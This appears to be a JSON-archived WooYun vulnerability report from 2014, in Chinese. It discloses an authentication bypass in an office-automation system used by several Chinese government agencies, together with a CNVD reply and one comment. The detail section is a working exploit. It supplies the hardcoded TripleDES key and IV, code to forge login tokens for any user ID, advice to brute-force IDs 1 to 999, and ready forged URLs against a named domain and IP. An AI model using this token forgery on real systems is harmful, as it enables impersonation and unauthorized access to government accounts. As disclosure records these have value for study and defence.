{"id": 4558, "wybug_id": "wooyun-2014-049930", "wybug_title": "某多家政府在用OA可伪造任意用户身份登录系统", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "wefgod", "wybug_date": "2014-01-27 17:15", "wybug_open_date": "2014-04-27 17:15", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "敏感接口缺乏认证", "逻辑错误", "越权操作", "敏感功能直接对外", "认证缺陷", "设计不当导致攻击界面扩大"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-27：\t细节向公众公开  简要描述： 直接伪造好数据就自动登录并分配cookie给你了 详细说明：  使用API接口无需用户密码就可以直接登录系统了。   漏洞证明：  http://www.dyjwoa.com/AuthReturn.aspx?APTokenResponse=a$8SOIYyiGVYBge5mdoY5nIeAueY7BixUtLdHqpy8o3RqM9hVnisaXAA==\n\n其实很简单，上面的Token组成最主要是用户的ID号（加密的数据，后面说）就可以无需密码登录成功，如果担心获取不到ID号，可以直接程序从1加密到999，必定会有一部分ID号是有对应用户的，这个不是问题，很简单。用.NET来做示例，以下是加密算法：\nstatic string tripleDESEncrypt(string inputString)        {            TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();            byte[] array = Encoding.UTF8.GetBytes(inputString);            tripleDESCryptoServiceProvider.Key = GetKey(\"3497C134D6252F8C85E8AEA1315626EC10D7F9E404916BA3\");            tripleDESCryptoServiceProvider.IV = GetKey(\"0102030405060708\");            MemoryStream memoryStream = new MemoryStream();            CryptoStream cryptoStream = new CryptoStream(memoryStream, tripleDESCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);            cryptoStream.Write(array, 0, array.Length);            cryptoStream.FlushFinalBlock();            return Convert.ToBase64String(memoryStream.ToArray());        }\n生成参数的方法：string text = \"a$\" + tripleDESEncrypt(\"0$1$846$admin$44$88000000009$6$7$8$9\");其中0$1$846$admin$44$88000000009$6$7$8$9，字符串里面的846可以替换为存在的任意一个ID号（不存在的也行，看返回的信息就知道了），admin字符串是用户名，没有用的只看ID号，开头的0是认证通过的参数，不可以改。其它数字随意改。最后上面的程序会生成a$8SOIYyiGVYBge5mdoY5nIeAueY7BixUtLdHqpy8o3RqM9hVnisaXAA==带入到链接的参数内即可。 顺便多伪造一个：http://61.160.252.80/Page/System/UserDetail.aspx?Id=7\n\nhttp://61.160.252.80/AuthReturn.aspx?APTokenResponse=a$hJVV5VPzCvr9ZMrpBcU/obmTefSp/oGFkEfolmJU6TxJTPkB9jZqcA==\n\n\n\n稍加修改可能会比较完美。   修复方案：  验证用户的密码或者结合实际的代码再看吧。总之不能只验证个加密的用户名就搞定了   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-02-01 22:47 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给江苏分中心，由江苏分中心后续尝试联系软件生产厂商，并已经同步下发给测试得到涉及的相关江苏省政府部门。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-03 16:51 |    \t\tMatt  \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:107        | 承接代码审计 http://codescan.cn/)\t\t \n  啥程序 求分享 我也去挖一波    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}